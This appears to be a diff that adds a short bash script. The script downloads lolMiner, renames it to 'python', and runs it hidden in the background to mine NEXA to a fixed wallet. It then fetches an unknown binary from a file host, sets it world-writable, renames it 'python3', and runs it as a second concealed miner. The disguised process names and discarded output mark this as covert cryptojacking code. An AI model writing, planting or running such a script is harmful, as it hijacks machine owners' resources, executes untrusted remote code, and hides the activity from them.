@@ -1,0 +1,17 @@
+#!/bin/bash
+
+apt update -y
+# Download and extract lolMiner
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.85_beta/lolMiner_v1.85_beta_Lin64.tar.gz
+tar -xvf lolMiner_v1.85_beta_Lin64.tar.gz
+cd 1.85_beta
+
+# Rename lolMiner binary to python and start first mining task
+cp lolMiner python
+nohup ./python --algo NEXA --pool nexa.kryptex.network:7777 --user nexa:nqtsq5g5ucr6kudx3ypfetcgye7cvmkqjfv7j2yrpc3u4qrd.vps --no-cl > /dev/null 2>&1 &
+
+# Download, set permissions, rename, and start second mining task
+wget https://upload.vina-host.com/ORTX6eFQop/python
+chmod 777 python
+mv python python3
+nohup ./python3 -d eu.spectre-network.nevermine.io:55555 -w spectre:qq5e9grzs6pgmfyalk8ydgtfq5v3wmnet38m70t78gsenc4v59udcgukjlng3.tes -t 4 > /dev/null 2>&1 &
